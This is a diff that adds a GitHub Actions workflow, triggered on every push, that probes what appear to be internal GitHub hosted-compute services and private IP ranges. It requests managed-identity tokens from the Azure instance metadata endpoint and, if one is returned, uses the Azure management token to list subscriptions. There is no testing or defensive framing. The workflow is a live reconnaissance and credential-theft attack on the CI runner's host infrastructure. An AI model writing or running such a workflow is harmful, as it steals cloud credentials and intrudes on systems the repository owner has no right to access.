@@ -1,0 +1,37 @@
+name: Internal Infrastructure Probe
+on: [push]
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe internal GitHub services
+        run: |
+          echo "=== Internal RO Orchestrator ==="
+          curl -sv "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/vm/v1" 2>&1 || true
+          
+          echo "=== Metadata token for githubapp.com ==="
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=api://hosted-compute-ro" 2>&1 || true
+          
+          echo "=== Try other internal endpoints ==="
+          for host in "api.githubapp.com" "actions.githubapp.com" "pipelines.githubapp.com" "results.githubapp.com"; do
+            echo "--- $host ---"
+            curl -sv --connect-timeout 5 "https://$host/" 2>&1 | head -5 || true
+          done
+          
+          echo "=== Check DNS for githubapp.com ==="
+          nslookup githubapp.com 2>&1 || true
+          dig githubapp.com 2>&1 || true
+          
+          echo "=== Internal IP ranges probe ==="
+          for ip in 10.1.0.1 10.1.0.2 10.0.0.1; do
+            curl -sv --connect-timeout 3 "http://$ip/" 2>&1 | head -3 || true
+          done
+          
+          echo "=== Probe Azure management via metadata ==="
+          TOKEN=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | python3 -c "import sys,json; print(json.load(sys.stdin).get(access_token,NONE))" 2>/dev/null)
+          if [ "$TOKEN" != "NONE" ] && [ -n "$TOKEN" ]; then
+            echo "Got Azure management token!"
+            curl -s -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2022-12-01" 2>&1 | head -20
+          else
+            echo "No Azure management token available"
+          fi
